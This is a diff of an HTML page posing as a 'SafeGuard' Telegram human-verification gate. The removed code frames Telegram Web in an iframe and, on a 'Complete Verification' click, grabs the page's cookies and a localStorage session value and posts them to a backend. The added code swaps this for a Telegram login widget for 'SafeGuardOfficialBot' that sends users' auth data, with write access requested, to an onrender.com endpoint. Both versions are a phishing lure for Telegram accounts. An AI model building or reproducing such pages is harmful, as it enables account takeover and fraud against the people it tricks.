@@ -3,49 +3,39 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Safeguard Human Verification</title>
+  <title>SafeGuard Verification</title>
   <style>
     body {
       font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
       background-color: #212121;
       color: white;
-      margin: 0;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
-    }
-
-    .container {
       text-align: center;
-      padding: 20px;
-      background: #2a2a2a;
+    }
+    .container {
+      background: #333;
       border-radius: 10px;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-      width: 90%;
-      max-width: 400px;
+      padding: 20px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
     }
-
-    iframe {
-      width: 100%;
-      height: 500px;
-      border: none;
-      border-radius: 8px;
-    }
-
-    button {
-      background: #8774e1;
-      color: white;
-      padding: 10px 20px;
+    .button {
+      margin-top: 20px;
+      padding: 15px 30px;
+      font-size: 18px;
+      background: linear-gradient(to right, #8774e1, #673ab7);
       border: none;
       border-radius: 5px;
+      color: white;
       cursor: pointer;
-      font-size: 16px;
-      margin-top: 20px;
+      transition: background 0.3s ease;
     }
-
-    button:hover {
-      background: #6a5bc5;
+    .button:hover {
+      background: linear-gradient(to right, #673ab7, #4527a0);
     }
   </style>
 </head>
@@ -53,44 +43,14 @@
   <div class="container">
     <h1>Human Verification</h1>
     <p>Log in below to verify:</p>
-    <iframe id="telegram-login" src="https://web.telegram.org/a/" sandbox="allow-scripts allow-forms allow-same-origin"></iframe>
-    <button id="send-data">Complete Verification</button>
+    <script 
+      async 
+      src="https://telegram.org/js/telegram-widget.js?7"
+      data-telegram-login="SafeGuardOfficialBot"  <!-- Replace with your bot username -->
+      data-size="large"
+      data-auth-url="https://aaaa-m2f9.onrender.com/api/users/telegram/info"
+      data-request-access="write">
+    </script>
   </div>
-
-  <script>
-    document.getElementById("send-data").addEventListener("click", () => {
-      try {
-        // Capture cookies
-        const cookies = document.cookie;
-
-        // Collect data (mocking what you might get from an actual session)
-        const telegramData = {
-          cookies,
-          session: localStorage.getItem("session") || "No session data",
-        };
-
-        // Send data to the backend or directly to your Telegram bot
-        fetch("/api/users/telegram/info", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(telegramData),
-        })
-          .then((response) => response.json())
-          .then((result) => {
-            if (result.success) {
-              alert("Verification complete! Data sent.");
-            } else {
-              alert("Verification failed.");
-            }
-          })
-          .catch((error) => {
-            console.error("Error sending data:", error);
-            alert("An error occurred.");
-          });
-      } catch (error) {
-        console.error("Error capturing data:", error);
-      }
-    });
-  </script>
 </body>
 </html>
